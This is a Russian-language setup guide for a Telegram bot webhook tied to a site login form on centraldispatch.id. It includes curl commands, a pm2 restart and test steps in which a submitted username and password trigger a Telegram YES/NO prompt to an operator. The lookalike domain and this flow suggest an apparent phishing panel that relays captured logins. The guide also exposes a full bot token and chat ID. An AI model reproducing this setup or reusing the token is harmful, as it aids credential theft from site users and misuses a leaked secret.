# ✅ Конфигурация Telegram бота

## Данные бота

- **Bot Username**: @Li0Lr8oWB13fdw615J9ebot
- **Bot Token**: `8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs`
- **Chat ID**: `5257327001` (KaroGabrielyan)

## Настройка на сервере

### 1. Обновить переменные окружения

Файл `ecosystem.config.js` уже обновлен с токеном и Chat ID.

### 2. Настроить Webhook

Выполните на сервере:

```bash
curl -X POST "https://api.telegram.org/bot8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs/setWebhook?url=https://centraldispatch.id/api/telegram/webhook"
```

Или через браузер откройте:
```
https://api.telegram.org/bot8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs/setWebhook?url=https://centraldispatch.id/api/telegram/webhook
```

Ожидаемый ответ:
```json
{"ok":true,"result":true,"description":"Webhook was set"}
```

### 3. Проверить Webhook

```bash
curl "https://api.telegram.org/bot8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs/getWebhookInfo"
```

### 4. Перезапустить приложение

```bash
ssh centraldispatch
cd /var/www/centraldispatch.id
source ~/.nvm/nvm.sh
pm2 restart centraldispatch-nextjs --update-env
pm2 save
```

### 5. Проверить работу

1. Откройте форму входа на сайте
2. Введите username и password
3. Нажмите SIGN IN
4. Должен появиться круговой loading
5. Проверьте Telegram - должно прийти сообщение с кнопками YES/NO
6. Нажмите YES или NO и проверьте результат

## Важно!

⚠️ **Bot Token секретный** - не коммитьте его в Git публично!
⚠️ После изменения переменных окружения обязательно перезапустите PM2 с `--update-env`

## Проверка Chat ID

Если сообщения не приходят, проверьте Chat ID:

1. Начните диалог с ботом @Li0Lr8oWB13fdw615J9ebot в Telegram
2. Отправьте любое сообщение боту
3. Выполните:
```bash
curl "https://api.telegram.org/bot8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs/getUpdates"
```
4. Найдите `"chat":{"id":5257327001}` - это ваш Chat ID

Если Chat ID отличается, обновите его в `ecosystem.config.js` и перезапустите приложение.

